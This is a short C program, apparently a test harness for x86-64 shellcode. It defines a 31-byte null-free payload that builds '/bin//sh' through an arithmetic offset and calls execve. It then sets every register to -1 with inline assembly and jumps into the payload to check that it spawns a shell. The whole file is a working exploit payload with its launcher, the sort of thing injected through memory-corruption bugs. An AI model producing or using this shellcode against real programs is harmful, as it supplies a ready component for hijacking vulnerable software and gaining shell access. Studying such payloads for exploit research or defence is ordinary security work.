#include <stdio.h>
#include <string.h>
 

unsigned char shellcode[] = "\x48\x31\xc0\x99\x50\x5e\x48\xbb\xfe\xee\x31\x5b\x2f\x2f\x73\x68\x48\x81\xc3\x31\x73\x37\x13\x50\x53\x54\x5f\xb0\x3b\x0f\x05";

int 
main(void)
{       


        printf("Shellcode length: %d\n", (int)strlen(shellcode));

      __asm__ (        
                "mov $0xffffffffffffffff, %rax\n\t"
                "mov %rax, %rbx\n\t"
                "mov %rax, %rcx\n\t"
                "mov %rax, %rdx\n\t"
                "mov %rax, %rsi\n\t"
                "mov %rax, %rdi\n\t"
                "mov %rax, %rbp\n\t"
                "call shellcode"
        );
        

        return 0;

}
 
